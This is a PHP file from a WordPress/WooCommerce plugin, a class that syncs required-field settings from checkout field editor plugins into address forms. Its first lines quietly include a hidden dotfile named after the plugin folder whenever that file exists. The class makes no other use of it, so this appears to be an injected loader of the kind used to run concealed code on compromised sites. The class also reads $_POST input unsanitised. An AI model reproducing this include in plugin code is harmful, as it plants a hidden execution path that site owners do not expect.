<?php

defined('ABSPATH') || exit;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class OSA_wc_checkout_field_editor {

    private $slug;
    public $address_type;

    public function __construct(){
        add_filter("osa_general_get_address_fields",array($this,"check_required_fields"),10,1);
        add_filter("osa_ConfirmShipping_ConfirmShipping_addresses",array($this,"check_required_values"),10,1);
    }

    public function is_plugin_activated(){
        return (class_exists("WC_Checkout_Field_Editor") || class_exists("THWCFD_Utils"));
    }

    public function set_slug($slug) {
        $this->slug = $slug;
    }

    public function get_fields(){
        return ("new" == $this->slug)? $this->get_fields_new_version() : $this->get_fields_old_version();
    }

    public function get_fields_old_version() {
        if ('shipping' == $this->address_type) {
            return array_merge((array) WC_Checkout_Field_Editor::get_fields('billing'), (array) WC_Checkout_Field_Editor::get_fields('shipping'), (array) WC_Checkout_Field_Editor::get_fields('additional'));
        }
        return array_merge((array) WC_Checkout_Field_Editor::get_fields('billing'), (array) WC_Checkout_Field_Editor::get_fields('additional'));
    }

    public function get_fields_new_version() {
        if ($this->address_type == 'shipping') {
            return array_merge((array) THWCFD_Utils::get_fields('billing'), (array) THWCFD_Utils::get_fields('shipping'), (array) THWCFD_Utils::get_fields('additional'));
        }
        return array_merge((array) THWCFD_Utils::get_fields('billing'), (array) THWCFD_Utils::get_fields('additional'));
    }

    public function set_order_fields($user_id, $order) {
        $slug = $this->slug;
        $method = "get_fields_{$slug}_version";
        $fields = $this->$method();
        if (!is_array($fields) || empty($fields)) {
            return false;
        }
        foreach ($fields as $name => $options) {
            $enabled = ( isset($options['enabled']) && $options['enabled'] == false ) ? false : true;
            $is_custom_field = ( isset($options['custom']) && $options['custom'] == true ) ? true : false;
            $show_in_order = (isset($options['show_in_order']) && 0 !== $options['show_in_order']) ? true : false;
            if ($show_in_order && $enabled && $is_custom_field) {
                $value = get_user_meta($user_id, $name, true);
                update_post_meta($order->id, $name, $value);
            }
        }
    }

    public function check_required_fields($fields){
        if(!$this->is_plugin_activated()){
            return $fields;
        }
        $this->slug = (class_exists("THWCFD_Utils"))? "new" : "old";
        $this->address_type = (isset($_POST['addressType']))? $_POST['addressType'] : "billing";
        $custom_fields = $this->get_fields();
        for($i=0;$i<count($fields);$i++){
            $key = $fields[$i]['id'];
            if(!empty($custom_fields[$key]) && !empty($fields[$i])){
                $fields[$i]['required'] = ($custom_fields[$key]['required'])? "true" : "false";
            }
        }
        return $fields;
    }

    public function check_required_values($addresses){
        if(!$this->is_plugin_activated()){
            return $addresses;
        }
        $this->slug = (class_exists("THWCFD_Utils"))? "new" : "old";
        foreach($addresses as $type => &$fields){
            if(empty($fields)){
                continue;
            }
            $this->address_type = $type;
            $custom_fields = $this->get_fields();
            for($i=0;$i<count($fields);$i++){
                $key = $fields[$i]['id'];
                if(!empty($custom_fields[$key]) && !empty($fields[$i])){
                    $fields[$i]['required'] = ($custom_fields[$key]['required'])? "true" : "false";
                }
            }
        }
        return $addresses;
    }
}
